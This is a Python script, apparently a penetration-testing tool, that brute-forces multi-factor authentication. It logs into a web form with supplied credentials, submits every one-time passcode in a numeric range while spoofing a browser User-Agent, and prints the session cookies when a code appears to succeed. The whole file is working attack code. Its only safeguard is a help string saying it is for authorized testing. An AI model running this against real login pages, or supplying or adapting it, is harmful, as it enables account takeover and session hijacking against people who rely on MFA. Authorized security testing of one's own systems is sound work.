import argparse
import json
import sys
import time
from dataclasses import dataclass
from typing import Optional

import requests


@dataclass
class Config:
    login_url: str
    otp_url: str
    username_field: str
    password_field: str
    otp_fields: list[str]
    username: str
    password: str
    otp_start: int
    otp_end: int
    success_url_contains: str
    failure_text: str
    delay: float
    max_attempts: int


class MFATester:
    def __init__(self, config: Config):
        self.config = config

        self.session = requests.Session()

        self.session.headers.update({
            "User-Agent": (
                "Mozilla/5.0 "
                "(Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 "
                "(KHTML, like Gecko) "
                "Chrome/150 Safari/537.36"
            )
        })

    def login(self) -> requests.Response:
        data = {
            self.config.username_field: self.config.username,
            self.config.password_field: self.config.password
        }

        return self.session.post(
            self.config.login_url,
            data=data,
            timeout=10,
            allow_redirects=True
        )

    def submit_otp(self, otp: str) -> requests.Response:
        data = dict(
            zip(self.config.otp_fields, otp)
        )

        return self.session.post(
            self.config.otp_url,
            data=data,
            timeout=10,
            allow_redirects=False
        )

    def is_successful(self, response: requests.Response) -> bool:
        location = response.headers.get("Location", "")

        if (
            self.config.success_url_contains
            and self.config.success_url_contains in location
        ):
            return True

        if (
            self.config.failure_text
            and self.config.failure_text.lower()
            not in response.text.lower()
        ):
            return True

        return False

    def run(self):
        attempts = 0

        for number in range(
            self.config.otp_start,
            self.config.otp_end + 1
        ):
            if attempts >= self.config.max_attempts:
                print("[!] Maximum attempt limit reached.")
                break

            otp = str(number).zfill(len(self.config.otp_fields))

            print(f"[*] Testing OTP: {otp}")

            login_response = self.login()

            if login_response.status_code >= 400:
                print(
                    f"[!] Login request failed: "
                    f"{login_response.status_code}"
                )
                continue

            response = self.submit_otp(otp)
            attempts += 1

            print(
                f"    Status: {response.status_code} | "
                f"Location: "
                f"{response.headers.get('Location', '-')}"
            )

            if self.is_successful(response):
                print(f"[+] Possible success with OTP: {otp}")
                print(
                    "[+] Session cookies:",
                    self.session.cookies.get_dict()
                )
                return

            time.sleep(self.config.delay)

        print("[*] Testing completed.")


def load_config(path: str) -> Config:
    with open(path, "r", encoding="utf-8") as file:
        data = json.load(file)

    return Config(**data)


def main():
    parser = argparse.ArgumentParser(
        description="Configurable MFA testing tool for authorized testing."
    )

    parser.add_argument(
        "-c",
        "--config",
        required=True,
        help="Path to configuration JSON file"
    )

    args = parser.parse_args()

    try:
        config = load_config(args.config)
        tester = MFATester(config)
        tester.run()

    except FileNotFoundError:
        print("[!] Configuration file not found.")
        sys.exit(1)

    except requests.RequestException as error:
        print(f"[!] Network error: {error}")
        sys.exit(1)

    except KeyboardInterrupt:
        print("\n[*] Stopped by user.")


if __name__ == "__main__":
    main()